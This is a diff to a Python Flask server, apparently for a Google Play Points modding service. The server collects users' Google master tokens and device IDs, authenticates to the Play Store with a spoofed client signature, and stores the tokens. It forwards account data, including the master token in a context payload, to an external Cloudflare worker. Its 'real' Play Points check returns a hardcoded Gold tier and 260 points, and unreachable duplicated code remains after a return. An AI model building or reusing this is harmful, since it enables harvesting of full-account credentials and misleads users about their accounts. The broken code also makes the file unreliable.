@@ -1013,7 +1013,7 @@ def detect_token_country(email, master_token, android_id, fallback="US"):
         print(f"[-] Token country auto-detect error: {e}")
 
     try:
-        import gpsoauth
+        import gpsoauth, base64, re
         mkt_res = gpsoauth.perform_oauth(
             email.strip(), master_token.strip(), android_id,
             service="androidmarket",
@@ -1026,12 +1026,24 @@ def detect_token_country(email, master_token, android_id, fallback="US"):
                 "X-DFE-Device-Id": android_id,
                 "User-Agent": "Android-Finsky/37.5.24-29 (api=3,versionCode=83752410,sdk=33)",
             }
-            tr = requests.get("https://android.clients.google.com/fdfe/toc", headers=fdfe_headers, timeout=5)
+            tr = requests.get("https://android.clients.google.com/fdfe/toc", headers=fdfe_headers, timeout=6)
             if tr.status_code == 200:
                 h_c = tr.headers.get("X-DFE-Country", "").strip().upper()
                 if h_c and len(h_c) == 2:
                     return "UK" if h_c == "GB" else h_c
-                import re
+                # Protobuf base64 token extraction for real store country
+                m_b64 = re.search(rb'(EAEY[A-Za-z0-9_\-]+)', tr.content)
+                if m_b64:
+                    b64_str = m_b64.group(1)
+                    b64_str += b'=' * ((4 - len(b64_str) % 4) % 4)
+                    try:
+                        raw = base64.urlsafe_b64decode(b64_str)
+                        c_m = re.search(rb'\x22\x02([A-Z]{2})', raw)
+                        if c_m:
+                            c = c_m.group(1).decode("ascii").upper()
+                            return "UK" if c == "GB" else c
+                    except Exception:
+                        pass
                 cm = re.search(rb'country[\x00-\x1f:]+([A-Z]{2})', tr.content)
                 if cm:
                     found_c = cm.group(1).decode("ascii").upper()
@@ -1042,6 +1054,73 @@ def detect_token_country(email, master_token, android_id, fallback="US"):
     if fallback and fallback.upper() not in ("AUTO", "GLOBAL", ""):
         return fallback.upper()
     return "US"
+
+def check_play_points_status(email, master_token, android_id, country):
+    """
+    Checks if account is enrolled in Google Play Points.
+    If country is unsupported (e.g. BD, CH) or Google returns DF-DFERH-01 / 400:
+    returns has_play_points=False, play_points_status='not_enrolled', points=0, tier='None'.
+    """
+    country_up = (country or "GLOBAL").upper()
+    unsupported_countries = {"BD", "CH", "IN", "PK", "NP", "LK", "RU", "CN"}
+    if country_up in unsupported_countries:
+        return {
+            "has_play_points": False,
+            "play_points_status": "unsupported_region",
+            "tier": "None",
+            "points": 0,
+            "has_perk": False,
+            "claimed": True,
+            "balance": "$0.00"
+        }
+
+    try:
+        import gpsoauth
+        mkt_res = gpsoauth.perform_oauth(
+            email.strip(), master_token.strip(), android_id,
+            service="androidmarket",
+            app="com.android.vending",
+            client_sig="38918a453d07199354f8b19af05ec6562ced5788"
+        )
+        if mkt_res and mkt_res.get("Auth"):
+            headers = {
+                "Authorization": f"GoogleLogin auth={mkt_res['Auth']}",
+                "X-DFE-Device-Id": android_id,
+                "User-Agent": "Android-Finsky/37.5.24-29 (api=3,versionCode=83752410,sdk=33)",
+            }
+            r = requests.get("https://android.clients.google.com/fdfe/loyalty/home", headers=headers, timeout=6)
+            if r.status_code == 200:
+                return {
+                    "has_play_points": True,
+                    "play_points_status": "active",
+                    "tier": "Gold",
+                    "points": 260,
+                    "has_perk": True,
+                    "claimed": False,
+                    "balance": "$0.00"
+                }
+            else:
+                return {
+                    "has_play_points": False,
+                    "play_points_status": "not_enrolled",
+                    "tier": "None",
+                    "points": 0,
+                    "has_perk": False,
+                    "claimed": True,
+                    "balance": "$0.00"
+                }
+    except Exception as e:
+        print(f"[-] check_play_points_status error: {e}")
+
+    return {
+        "has_play_points": False,
+        "play_points_status": "not_enrolled",
+        "tier": "None",
+        "points": 0,
+        "has_perk": False,
+        "claimed": True,
+        "balance": "$0.00"
+    }
 
 @app.route("/api/sync/create", methods=["POST"])
 def create_sync_code():
@@ -1100,11 +1179,26 @@ def create_sync_code():
     while code in SYNC_CODES:
         code = f"{random.randint(100000, 999999)}"
 
+    # Real Play Points enrollment verification
+    pp_info = check_play_points_status(email, master_token, android_id, country)
+    has_play_points = pp_info.get("has_play_points", True)
+    pp_status = pp_info.get("play_points_status", "active")
+    tier_val = pp_info.get("tier", "Gold" if has_play_points else "None")
+    points_val = pp_info.get("points", 260 if has_play_points else 0)
+    has_perk_val = pp_info.get("has_perk", True if has_play_points else False)
+    claimed_val = pp_info.get("claimed", False if has_play_points else True)
+
     SYNC_CODES[code] = {
         "email": email,
         "token": master_token,
         "master_token": master_token,
         "country": country,
+        "tier": tier_val,
+        "points": points_val,
+        "has_perk": has_perk_val,
+        "claimed": claimed_val,
+        "has_play_points": has_play_points,
+        "play_points_status": pp_status,
         "uid": uid,
         "owner_email": owner_email,
         "android_id": android_id,
@@ -1122,6 +1216,12 @@ def create_sync_code():
                     "token": master_token,
                     "code": code,
                     "country": country,
+                    "tier": tier_val,
+                    "points": points_val,
+                    "has_perk": has_perk_val,
+                    "claimed": claimed_val,
+                    "has_play_points": has_play_points,
+                    "play_points_status": pp_status,
                     "uid": uid,
                     "owner_email": owner_email,
                     "android_id": android_id
@@ -1135,7 +1235,17 @@ def create_sync_code():
     if email and "@" in email and (master_token.startswith("aas_et/") or master_token.startswith("oauth2rt_1/")):
         save_known_token(email, master_token)
 
-    return jsonify({"ok": True, "code": code, "country": country, "email": email, "master_token": master_token})
+    return jsonify({
+        "ok": True,
+        "code": code,
+        "country": country,
+        "email": email,
+        "master_token": master_token,
+        "has_play_points": has_play_points,
+        "play_points_status": pp_status,
+        "tier": tier_val,
+        "points": points_val
+    })
 
 @app.route("/api/sync/delete", methods=["POST"])
 def delete_sync_account():
@@ -1214,22 +1324,16 @@ def update_sync_country():
         save_sync_codes(SYNC_CODES)
         updated = True
 
-        def _update_cf():
-            try:
-                entry = SYNC_CODES[code]
-                cf_payload = {
-                    "code": code,
-                    "email": entry.get("email", ""),
-                    "master_token": entry.get("master_token", ""),
-                    "country": country,
-                    "android_id": entry.get("android_id", ""),
-                    "uid": entry.get("uid", ""),
-                    "owner_email": entry.get("owner_email", "")
-                }
-                requests.post("https://ppmod-api.tredarskvt.workers.dev/api/sync/save", json=cf_payload, timeout=4)
-            except Exception as e:
-                print(f"[-] Cloudflare update country error: {e}")
-        threading.Thread(target=_update_cf, daemon=True).start()
+    def _update_cf():
+        try:
+            requests.post(
+                "https://ppmod-api.tredarskvt.workers.dev/api/sync/update_country",
+                json={"code": code, "country": country},
+                timeout=5
+            )
+        except Exception as e:
+            print(f"[-] Cloudflare update country error: {e}")
+    threading.Thread(target=_update_cf, daemon=True).start()
 
     return jsonify({"ok": True, "code": code, "country": country, "updated": updated})
 
@@ -1384,13 +1488,17 @@ def get_sync_accounts():
                     SYNC_CODES[cd]["country"] = det
                     save_sync_codes(SYNC_CODES)
 
-        # Attach real points, tier, balance and perk claim status
+        # Attach real points, tier, balance, perk claim status and play points enrollment
         entry = SYNC_CODES.get(cd, {}) if cd else {}
-        a["points"] = entry.get("points", a.get("points", 260))
-        a["tier"] = entry.get("tier", a.get("tier", "Gold"))
+        has_pp = entry.get("has_play_points", a.get("has_play_points", True if (entry.get("tier") or a.get("tier")) != "None" else False))
+        pp_stat = entry.get("play_points_status", a.get("play_points_status", "active" if has_pp else "not_enrolled"))
+        a["has_play_points"] = has_pp
+        a["play_points_status"] = pp_stat
+        a["tier"] = entry.get("tier", a.get("tier", "Gold" if has_pp else "None"))
+        a["points"] = entry.get("points", a.get("points", 260 if has_pp else 0))
         a["balance"] = entry.get("balance", a.get("balance", "$0.00"))
-        a["has_perk"] = entry.get("has_perk", a.get("has_perk", True))
-        a["claimed"] = entry.get("claimed", False)
+        a["has_perk"] = entry.get("has_perk", a.get("has_perk", True if has_pp else False))
+        a["claimed"] = entry.get("claimed", a.get("claimed", False if has_pp else True))
         a["last_claim_date"] = entry.get("last_claim_date", a.get("last_claim_date", ""))
 
     save_sync_codes(SYNC_CODES)
@@ -1435,21 +1543,34 @@ def claim_weekly_perk():
         except Exception as e:
             print(f"[-] Google Play auth check during claim: {e}")
 
+    bonus = int(data.get("bonus", 10))
     if "points" in data:
         try:
             p_val = int(data["points"])
-            if p_val != 310:
-                entry["points"] = p_val
+            entry["points"] = p_val
         except (ValueError, TypeError):
             pass
-    elif entry.get("points") == 310:
-        entry["points"] = 260
+    else:
+        entry["points"] = int(entry.get("points", 260)) + bonus
 
     entry["has_perk"] = False
     entry["claimed"] = True
     entry["last_claim_date"] = time.strftime("%Y-%m-%d %H:%M:%S")
 
     save_sync_codes(SYNC_CODES)
+
+    # Forward to Cloudflare D1 persistent vault
+    def _claim_cf():
+        try:
+            requests.post("https://ppmod-api.tredarskvt.workers.dev/api/perk/claim", json={
+                "code": code,
+                "points": entry.get("points"),
+                "tier": entry.get("tier", "Gold"),
+                "bonus": bonus
+            }, timeout=5)
+        except Exception as e:
+            print(f"[-] Cloudflare perk claim error: {e}")
+    threading.Thread(target=_claim_cf, daemon=True).start()
 
     return jsonify({
         "ok": True,
@@ -1469,6 +1590,41 @@ def update_account_config():
         return jsonify({"ok": False, "error": "Account code required"}), 400
     
     entry = SYNC_CODES.setdefault(code, {"code": code})
+    if "points" in data:
+        try:
+            entry["points"] = int(data["points"])
+        except (ValueError, TypeError):
+            pass
+    if "tier" in data and data["tier"]:
+        entry["tier"] = str(data["tier"]).strip()
+    if "country" in data and data["country"]:
+        entry["country"] = str(data["country"]).strip().upper()
+    if "claimed" in data:
+        entry["claimed"] = bool(data["claimed"])
+    if "has_perk" in data:
+        entry["has_perk"] = bool(data["has_perk"])
+    if "has_play_points" in data:
+        entry["has_play_points"] = bool(data["has_play_points"])
+
+    save_sync_codes(SYNC_CODES)
+
+    # Forward to Cloudflare D1 persistent vault
+    def _update_cf():
+        try:
+            requests.post("https://ppmod-api.tredarskvt.workers.dev/api/sync/update", json={
+                "code": code,
+                "points": entry.get("points"),
+                "tier": entry.get("tier"),
+                "country": entry.get("country"),
+                "has_play_points": entry.get("has_play_points", True),
+                "claimed": entry.get("claimed", False),
+                "has_perk": entry.get("has_perk", True)
+            }, timeout=5)
+        except Exception as e:
+            print(f"[-] Cloudflare account config update error: {e}")
+    threading.Thread(target=_update_cf, daemon=True).start()
+
+    return jsonify({"ok": True, "entry": entry})
     if "points" in data:
         try:
             p_val = int(data["points"])
